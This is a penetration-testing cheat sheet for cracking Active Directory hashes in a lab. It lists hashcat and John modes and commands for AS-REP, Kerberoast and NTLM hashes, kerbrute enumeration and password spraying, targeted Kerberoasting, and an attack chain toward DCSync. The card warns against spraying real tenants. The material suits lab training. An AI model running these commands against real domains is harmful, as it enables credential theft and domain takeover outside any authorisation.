# Hashcat / John / kerbrute (senior)

Crack in the lab. Do not spray Entra / smart-lockout tenants with this card.

## Modes

| What | Mode | Marker |
| --- | --- | --- |
| AS-REP | `18200` | `$krb5asrep$23$` |
| TGS RC4 | `13100` | `$krb5tgs$23$` |
| TGS AES128/256 | `19600` / `19700` | `$krb5tgs$17$` / `$18$` |
| NetNTLMv2 | `5600` | `user::domain:16hex:…` |
| NTLM | `1000` | 32 hex |
| NetNTLMv1 | `5500` | rare; often worth `-m 5500` if you see it (KPA) |

## Flags that matter

```
hashcat -m 18200 /logs/hashes/asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 /logs/hashes/kerb.txt  /usr/share/wordlists/rockyou.txt
hashcat -m 19700 /logs/hashes/kerb-aes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600  /logs/hashes/netntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000  /logs/hashes/ntlm.txt /usr/share/wordlists/rockyou.txt

# GOAD / known lab list first (ships as conf/wordlist-lab.txt.example)
hashcat -m 18200 asrep.txt /opt/adtk/conf/wordlist-lab.txt.example

# show
hashcat -m 18200 asrep.txt --show --outfile-format 3
```

John (CPU) — **the default inside a headless Kali VM/container**. Most labs have
no GPU runtime, so `hashcat` dies with `No OpenCL, HIP or CUDA compatible
platform found`. Don't fight it — go straight to john (rockyou at CPU speed still
finishes lab hashes in minutes):

```
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
john --format=krb5tgs    --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
john --show --format=krb5asrep asrep.txt
```

## Crack on the HOST, not the Kali VM

The attack VM is the wrong place to crack: headless Kali has no GPU runtime, so
hashcat dies and john grinds rockyou at CPU speed. Both live runs lost time here
(`.refinements/1.md` dead-ended on AS-REP). The host (an Apple-Silicon Mac with
hashcat's Metal backend, or any real GPU) is far faster. `ad-auto.py` time-boxes
its on-box crack to `ADTK_CRACK_BUDGET` (default 90s) and then hands you the
offload command — don't let a hopeless wordlist block the chain.

```
# capture on Kali (ad-auto / GetUserSPNs write logs/<dc>/hashes/kerb.txt),
# pull it to the host (MCP logs_read, or scp), then on the HOST:
ADTK_WORDLIST=~/wordlists/rockyou.txt \
  scripts/host-crack.sh --mode 13100 --hash ./kerb.txt --budget 300 --background
# prints user:pass, writes ./kerb.txt.cracked. Keep enumerating (BloodHound /
# ACL / ADCS) while it runs, then feed the cred back to the chain.
```

`host-crack.sh` tries hashcat (Metal/OpenCL) first, falls back to john, and does
not download rockyou — point `--wordlist` / `ADTK_WORDLIST` at one. Modes:
18200 AS-REP, 13100 TGS-RC4, 19600/19700 TGS-AES, 5600 NetNTLMv2, 1000 NTLM.

kerbrute (quieter than SMB spray; still lockout-capable):

```
kerbrute userenum --dc {{DC}} -d {{DOMAIN}} users.txt
kerbrute passwordspray --dc {{DC}} -d {{DOMAIN}} users.txt 'Welcome1'
# read pass-pol FIRST. cap attempts.
```

targetedKerberoast (only if BH says you can write a SPN):

```
targetedKerberoast.py -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' --dc-ip {{DC}} \
  -o /logs/hashes/targeted.txt
```

## Read this

- Pair the **username inside the hash** with the plaintext. Do not assign the first crack to the first file line.
- `Status: Exhausted` is a result. Keep the hash. Move to BloodHound.
- `sql_svc` on GOAD is intentionally hard. Stop burning GPU.
- **AS-REP roast came back 0-cracked (rockyou) and guest binds?** Don't spray —
  pivot to Kerberoast from guest (`impacket.md`, Operation Endgame). The room's
  intended cred is usually an SPN hash, not an AS-REP one.

## Fail → next

| Symptom | Next |
| --- | --- |
| `No OpenCL, HIP or CUDA compatible platform found` (VM/container) | crack on the HOST (`host-crack.sh`, Metal/GPU), else `john` (CPU) |
| on-box crack hit the `ADTK_CRACK_BUDGET` and stopped | expected — pull the hash to the host and run `host-crack.sh --background`, keep enumerating |
| no GPU / `clGetPlatformIDs` | john, or `-D 1` (CPU). labs do not need a 4090 |
| AES TGS, 13100 empty | 19700/19600 |
| 5600 not cracking | relay the next handshake instead |
| kerbrute `KDC_ERR_CLIENT_REVOKED` | you locked it. stop |
| wordlist miss | rule `/usr/share/hashcat/rules/best64.rule` once, then quit |

## Chain

Hash → this card → nxc as that user → BloodHound. Never spray a cracked DA across the CIDR before you DCSync.
